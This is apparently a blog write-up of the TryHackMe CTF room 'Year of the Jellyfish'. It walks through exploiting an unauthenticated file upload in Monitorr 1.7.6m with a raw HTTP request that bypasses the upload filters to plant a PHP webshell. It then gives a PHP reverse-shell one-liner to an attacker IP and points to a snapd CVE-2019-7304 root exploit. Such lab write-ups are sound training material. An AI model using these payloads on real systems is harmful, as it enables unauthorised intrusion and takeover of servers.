---
layout: post
title: CTF Log - Year of the Jellyfish (THM)
description: A log of how I did the TryHackMe room Year of the Jellyfish by Muirland Oracle
summary: A log of the THM room "Year of the Jellyfish"
tags: ctf log
minute: 5
---
<br/>

> {{ page.description }}

<br/>

# Year of the Jellyfish
## Monitorr 1.7.6m Unauthed File Upload
The initial nmap scan returned the following open TCP ports: 21, 22, 80, 443, 8000, 8096. As it would turn out, ports 8000 and 8096 are red herrings and don't lead to any foothold on the box. This is something I was sad to discover, as I was looking forward to exploiting the Jellyfin Media Server.

Looking into the SSL certificate for `robyns-petshop.thm`, I see that it also supports the subdomains `monitorr`, `dev`, and `beta`. 

Navigating to `https://monitorr.robyns-petshop.thm` I find Monitorr v1.7.6m is running. This version has an unauthenticated file upload vulnerability, which can naturally be converted into RCE. 

I also notice that my requests are sending the cookie `isHuman=1`. I change the value to `0` to see what happens and it doesn't like it, accusing me of being a hacker. That's prepostorous of course so I note to send `Cookie: isHuman=1` with all future requests. 

As I'm practicing for the OSWE exam, I choose to build my own exploit code based on the knowledge that the vulnerability relates to the file `/assets/php/upload.php`. 

Lets break down this portion of the `upload.php` file. 
```php
 $target_dir = "../data/usrimg/";
 $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
 $uploadOk = 1;
 $imageFileType = strtolower(pathinfo($target_file,PATHINFO_EXTENSION));
 $check = getimagesize($_FILES["fileToUpload"]["tmp_name"]);
 $rawfile = $_FILES["fileToUpload"]["name"];
 ```

On line 2, the $\_FILES is a superglobal PHP variable that refers to files uploaded through a POST request. 

The first subscript `["fileToUpload"]` refers to the name of the file upload section in the multipart/form-data formatted POST request body. 

The second subscript `["name"]` refers to the actual filename, as it was uploaded. In this case, `name` is a placeholder for the actual filename, not the name of the file. 

Anyway, all this is piece of code is saying, is that it will save the file I send in a POST request to the `upload.php` endpoint.

For a preliminary proof of concept, I make a simple HTML upload form:

 ```html
 <form action="https://monitorr.robyns-petshop.thm/assets/php/upload.php" method="post" enctype="multipart/form-data">
 	<input type="file" name="fileToUpload" />
 	<input type="submit" />
 </form>
 ```

By capturing the request in burp and sending it to repeater, I'm able to easily fuzz and experiment with different payloads. 

Through a bit of experimentation, I determine the following limitations:

- filename extension cannot begin with `.php`
- filename must have an image filetype extension 
- file must begin with magic bytes corresponding to an image file

I'm able to bypass the filters and upload a `.phtml` file which will render and execute PHP code using the following POST request:

```
POST /assets/php/upload.php HTTP/1.1
Host: monitorr.robyns-petshop.thm
Content-Type: multipart/form-data; boundary=--------------------------190412675211009862293213789695
Content-Length: 350
Cookie: isHuman=1

-----------------------------190412675211009862293213789695
Content-Disposition: form-data; name="fileToUpload"; filename="webshell.png.phtml"
Content-Type: image/png

PNG
<?php passthru($_GET["c"]);
-----------------------------190412675211009862293213789695--
```

Note:

- The filename `webshell.png.phtml` satisfies the image filetype extension requirement while bypassing the `/\.php.*/` pattern matching filter for the extension.
- Some experimentation was needed to determine that the webshell payload `<?php passthru($_GET["c"]);` should not have a closing bracket `>` to properly function.

![Output of 'id' on the webshell page. You can see some of the binary data from the image file being rendered as unicode characters.](/assets/media/yearofthejellyfish/webshell.png)

I URL encoded this PHP oneliner reverse shell `php -r '$sock=fsockopen("<IP>",<PORT>);exec("/bin/sh -i <&3 >&3 2>&3");'` and caught a shell as `www-data`. 

## CVE-2019-7304
After some enumeration the command `apt list --upgradeable` shows me an outdated version of Snapd: `snapd/bionic-updates 2.49.2+18.04 amd64 [upgradable from: 2.32.5+18.04]`. This version is susceptible to a neat vulnerability, CVE-2019-7304, that involves creating a UbuntuOne account online. 

After creating an account, you provide it with a public SSH key and then use the private counterpart to start a malicious socket connection to the package manager. 

From there you're able to create a new user with root privileges. 

The comments on [this](https://github.com/initstring/dirty_sock/blob/master/dirty_sockv1.py) PoC are well written and teach a good bit about how the exploit functions. 
